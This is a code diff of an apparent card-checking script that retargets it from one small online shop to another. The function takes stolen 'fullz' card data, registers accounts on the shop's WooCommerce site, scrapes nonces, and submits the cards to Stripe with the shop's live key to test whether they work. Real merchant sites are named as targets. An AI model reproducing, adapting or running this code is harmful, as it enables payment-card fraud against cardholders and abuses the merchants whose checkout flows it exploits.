@@ -96,7 +96,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
 
         # STEP 1: get nonce from greenkidcrafts.com
         response = await session.get(
-            "https://rideworks.cc/my-account/", headers=headers
+            "https://snoopyspetsupplies.ie/my-account", headers=headers
         )
         register1_nonce = gets(
             response.text,
@@ -119,7 +119,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             'wc_order_attribution_utm_source_platform': '(none)',
             'wc_order_attribution_utm_creative_format': '(none)',
             'wc_order_attribution_utm_marketing_tactic': '(none)',
-            'wc_order_attribution_session_entry': 'https://rideworks.cc/my-account',
+            'wc_order_attribution_session_entry': 'https://snoopyspetsupplies.ie/my-account',
             'wc_order_attribution_session_start_time': '2025-09-15 12:54:53',
             'wc_order_attribution_session_pages': '6',
             'wc_order_attribution_session_count': '1',
@@ -129,14 +129,14 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             'register': 'Register',
         }
         await session.post(
-            "https://rideworks.cc/my-account/",
+            "https://snoopyspetsupplies.ie/my-account/",
             headers=headers,
             data=data,
         )
 
         # STEP 3: add payment page
         response = await session.get(
-            "https://rideworks.cc/my-account/add-payment-method/",
+            "https://snoopyspetsupplies.ie/my-account/add-payment-method/",
             headers=headers,
         )
         setup_nonce0 = gets(
@@ -154,7 +154,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "card[exp_month]": mes,
             "card[exp_year]": ano,
             "billing_details[address][country]": "PK",
-            "key": "pk_live_51K1s67LYSSTHoyZSUPAuF0bXc1B1GjFC81z0M6aiYz9VewRiJkBjyrKCa4lCQUBK70SUBXRycGUTlqzwncW5kOVQ00yXoyfES6",
+            "key": "pk_live_51PGx9TJxNKubmI9BngUz5kw8tU6OfoBEWwYoBCm2xN4iPTO6eGbcuZVojYyNF9rJ2gFMo5fNQeEUJyVYMNg37rFJ00S3RRrp8s",
         }
         resp = await session.post(
             "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
@@ -182,7 +182,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             '_ajax_nonce': setup_nonce,
         }
         final = await session.post(
-            "https://rideworks.cc",
+            "https://snoopyspetsupplies.ie",
             params=params,
             headers=headers,
             data=data,
